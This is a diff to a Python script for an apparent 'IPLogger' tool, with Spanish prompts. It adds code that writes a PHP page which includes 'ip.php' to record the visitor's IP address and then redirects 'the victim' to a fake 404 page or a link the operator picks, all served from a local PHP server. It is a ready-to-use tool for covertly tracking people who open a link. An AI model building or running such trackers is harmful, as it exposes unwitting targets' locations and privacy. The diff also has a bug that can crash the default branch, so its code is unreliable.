@@ -1,5 +1,6 @@
+#!/usr/bin/python3
+
 import os
-import subprocess
 import time
 
 logo = """\033[33m
@@ -8,9 +9,9 @@ logo = """\033[33m
    | | | |__) | |   | |  | | |  __| |  __| |__  | |__) |
    | | |  ___/| |   | |  | | | |_ | | |_ |  __| |  _  / 
   _| |_| |    | |___| |__| | |__| | |__| | |____| | \ \ 
- |_____|_|    |______\____/ \_____|\_____|______|_|  \_\
- 
-            By: Euronymou5
+ |_____|_|    |______\____/ \_____|\_____|______|_|  \_\\
+
+                  By: Euronymou5
 """
 
 def check():
@@ -28,7 +29,34 @@ def check():
 
 def server():
     os.system("clear")
+    print(logo)
     print('[~] Iniciando servidor php...')
+    var1 = input('\n[~] ¿Quieres utilizar la pagina por default? (Error 404 HTML) [Y/n]: ')
+    if var1 == "y" or var1 == "Y":
+      file = open('index.php', 'r+')
+      ler = file.read()
+      file.close()
+      if "index.html" in ler:
+        pass
+      else:
+        global file2
+        os.system("rm index.php && touch index.php")
+        file2 = open('index.php', 'w')
+        file2.write("""<?php
+include 'ip.php';
+header('Location: index.html');
+exit();
+?>""")
+      file2.close()
+    elif var1 == "n" or var1 == "N":
+      link = input('\n[~] Ingresa el link para redirigir a la victima (e.j: https://youtube.com): ')      
+      file = open('index.php', 'w')
+      file.write("""<?php
+include 'ip.php';
+header('Location: index.html');
+exit();
+?>""".replace("index.html", link))
+      file.close()     
     var = input('[~] ¿Quieres editar el puerto? (Default: 8080) [Y/n]: ')
     if var == "Y" or var == "y":
         port = int(input('\n[~] Ingresa el puerto: '))
@@ -45,6 +73,7 @@ def server():
         print('\n[!] Error Debes de ingresar una opcion Y/n')
         time.sleep(2)
         server()
+    
 
 def menu():
     os.system("killall php")
